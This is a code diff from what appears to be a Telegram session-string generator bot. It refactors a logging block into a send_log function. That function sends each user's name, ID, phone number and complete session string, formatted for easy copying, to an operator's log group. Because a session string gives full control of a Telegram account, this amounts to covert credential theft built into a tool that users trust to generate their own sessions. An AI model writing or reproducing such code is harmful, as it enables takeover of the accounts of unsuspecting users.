@@ -95,22 +95,22 @@ async def generate_telethon_session(bot, query: CallbackQuery):
     )
 
     # 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
-if LOG_GROUP_ID:
-    log_text = (
-        f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
-        f"👤 <b>User:</b> {name}\n"
-        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
-        f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
-        f"🛠 <b>Type:</b> Pyrogram\n\n"
-        f"✨ <b>Session (Tap to Copy):</b>\n"
-        f"<code>{string_session}</code>"
-    )
-    try:
-        await bot.send_message(
-            LOG_GROUP_ID,
-            log_text,
-            parse_mode="HTML"
+async def send_log(bot, name, user_id, phone_number, string_session):
+    if LOG_GROUP_ID:
+        log_text = (
+            f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
+            f"👤 <b>User:</b> {name}\n"
+            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+            f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
+            f"🛠 <b>Type:</b> Pyrogram\n\n"
+            f"✨ <b>Session (Tap to Copy):</b>\n"
+            f"<code>{string_session}</code>"
         )
-    except Exception as e:
-        print(e)
-          
+        try:
+            await bot.send_message(
+                LOG_GROUP_ID,
+                log_text,
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            print(e)
